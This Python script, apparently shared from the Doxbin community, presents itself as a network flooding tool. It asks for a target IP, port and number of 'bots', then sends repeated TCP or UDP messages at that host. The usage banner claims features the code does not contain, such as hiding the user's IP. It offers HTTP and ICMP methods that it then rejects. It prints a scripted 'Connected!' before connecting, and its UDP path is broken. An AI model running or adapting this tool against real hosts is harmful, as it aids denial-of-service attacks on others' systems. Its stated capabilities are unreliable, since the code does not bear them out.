from colorama import Fore, Style
import socket
import sys
import time
import random

def print_red_ascii_art(ascii_art):
    for line in ascii_art.splitlines():
        print(f"{Fore.RED}{line}{Style.RESET_ALL}")

def send_packets(ip_address, port, number_of_bots, bot_speed, message, method):
    sock = None
    packega = 0
    connected_count = 0
    failed_count = 0

    try:
        if method.lower() == 'tcp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip_address, port))
        elif method.lower() == 'udp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            print(f"{Fore.RED}Invalid method. Supported methods: TCP, UDP{Style.RESET_ALL}")
            return

    except socket.error as e:
        print(f"{Fore.RED}Failed to Connect (Errno: {e.errno}){Style.RESET_ALL}")
        return

    try:
        while packega < number_of_bots:
            try:
                sock.sendall(message.encode())
                packega += 1
                time.sleep(bot_speed)
                connected_count += 1
                print(f"Bots Send --> {packega}")
            except socket.error as e:
                print(f"{Fore.RED}Error sending packet: {e}{Style.RESET_ALL}")
                failed_count += 1

    except KeyboardInterrupt:
        print("\nUser interrupted the process.")

    finally:
        if sock:
            sock.close()
        print(f"\nConnected: {connected_count} | Failed: {failed_count}")

def connect_to_ip(ip_address, port, number_of_bots):
    try:
        socket.inet_aton(ip_address)
    except socket.error:
        print(f"{Fore.RED}Failed to Connect (Errno: IP_Not_Found_101){Style.RESET_ALL}")
        return

    bot_speed = float(input("Enter bot's speed (in seconds) ---> "))
    if bot_speed < 0.2:
        print(f"{Fore.RED}Error: Bot speed cannot be less than 0.2 seconds.{Style.RESET_ALL}")
        return

    message = input("Enter TCP/UDP message (press Enter to skip) ---> ")

    method = input("Enter a Method (TCP, UDP, HTTP, ICMP) ---> ")
    
    choice = input(f"Connect to {ip_address}:{port}? (y/n): ")
    if choice.lower() == 'y':
        time.sleep(1)
        print(f"{Fore.GREEN}Connecting...{Style.RESET_ALL}")
        time.sleep(2)
        print("\n")
        time.sleep(1)
        print(f"{Fore.GREEN}Connected!{Style.RESET_ALL}")
        send_packets(ip_address, port, number_of_bots, bot_speed, message, method)
    elif choice.lower() == 'n':
        sys.exit()
    else:
        print("Invalid choice. Please enter 'y' or 'n'.")

if __name__ == "__main__":
    ascii_art = """
    ███████╗ █████╗ ███████╗████████╗██╗███╗   ██╗ ██████╗     Made by Bluer on Doxbin
    ██╔════╝██╔══██╗██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝ 
    ███████╗███████║███████╗   ██║   ██║██╔██╗ ██║██║  ███╗
    ╚════██║██╔══██║╚════██║   ██║   ██║██║╚██╗██║██║   ██║
    ███████║██║  ██║███████║   ██║   ██║██║ ╚████║╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝     Version: 2.0.2
    """

    print_red_ascii_art(ascii_art)

    print("\n\n-------------------------------------------------------------------------------------------------------")

    usage_text = """
    Properties:
    SpyMode  Your IP will be hiden when attacking.
    Speed    Set Speed of Attack per Bot.
    Message  Massages to server when connecting.
    RepChek  Checks the server's reply.
    LocalM   Uses your processor when attacking.
    Energy+  Increases lifespan by using very little ram.
    AntiCRH  The application closes before your computer is crashed.
    """

    colored_usage_text = f"{Fore.RED}{usage_text}{Style.RESET_ALL}"
    print(colored_usage_text)

    print("\n\n-------------------------------------------------------------------------------------------------------")


    while True:
        ip_address = input("Enter IP Address ---> ")
        port = int(input("Enter Port ---> "))
        
        try:
            number_of_bots = int(input("Number of bots to send ---> "))
            connect_to_ip(ip_address, port, number_of_bots)
        except ValueError:
            print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")

        exit_choice = input("\nExit? (y/n): ")
        if exit_choice.lower() == 'y':
            sys.exit()
